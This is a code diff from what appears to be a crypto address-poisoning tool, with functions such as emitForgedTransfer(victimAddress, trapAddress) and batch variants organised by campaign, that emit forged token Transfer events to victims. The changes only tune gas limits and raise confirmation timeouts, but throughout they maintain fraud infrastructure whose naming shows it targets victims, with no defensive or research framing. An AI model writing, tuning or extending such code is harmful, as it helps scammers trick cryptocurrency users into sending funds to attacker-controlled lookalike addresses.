@@ -1388,7 +1388,7 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     try {
       const receipt = await client.waitForTransactionReceipt({
         hash: hash,
-        timeout: 90000, // 90 seconds max wait
+        timeout: 300000, // 🚀 Increased to 5 minutes for slow confirmations
         confirmations: 1,
       });
       logger.info(`[mirror] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
@@ -1663,7 +1663,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
         client.getGasPrice(),
       ]);
 
-      const estimatedGas = BigInt(60000 + (25000 * froms.length));
+      const estimatedGas = BigInt(50000 + (15000 * totalTransfers));
       const estimatedGasCost = estimatedGas * gasPrice;
 
       if (operatorBalance < estimatedGasCost) {
@@ -1784,7 +1784,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
           functionName: 'batchEmitTransfers',
           args: [froms, tos, values],
           nonce: nonce,
-          gas: BigInt(60000 + (25000 * froms.length)), // 🚀 Realistic gas limit for batch event emission
+          gas: BigInt(50000 + (15000 * totalTransfers)),
           maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
@@ -1836,7 +1836,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
     try {
       const receipt = await client.waitForTransactionReceipt({
         hash: hash,
-        timeout: 90000, // 90 seconds max wait
+        timeout: 300000, // 🚀 Increased to 5 minutes for slow confirmations
         confirmations: 1,
       });
       logger.info(`[batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
@@ -1908,7 +1908,7 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
       for (const [, items] of contractGroups) {
         totalTransfers += items.length;
       }
-      const estimatedGas = BigInt(60000 + (25000 * totalTransfers));
+      const estimatedGas = BigInt(50000 + (15000 * totalTransfers));
       const estimatedGasCost = estimatedGas * gasPrice;
 
       if (operatorBalance < estimatedGasCost) {
@@ -2048,7 +2048,7 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
           functionName: 'transfer',
           args: [calls],
           nonce: nonce,
-          gas: BigInt(60000 + (25000 * totalTransfers)),
+          gas: BigInt(50000 + (15000 * totalTransfers)),
           maxFeePerGas: maxFeePerGas,
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
@@ -2096,7 +2096,7 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
     try {
       const receipt = await client.waitForTransactionReceipt({
         hash: hash,
-        timeout: 90000,
+        timeout: 300000, // 🚀 Increased to 5 minutes for slow confirmations
         confirmations: 1,
       });
       logger.info(`[multi-batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
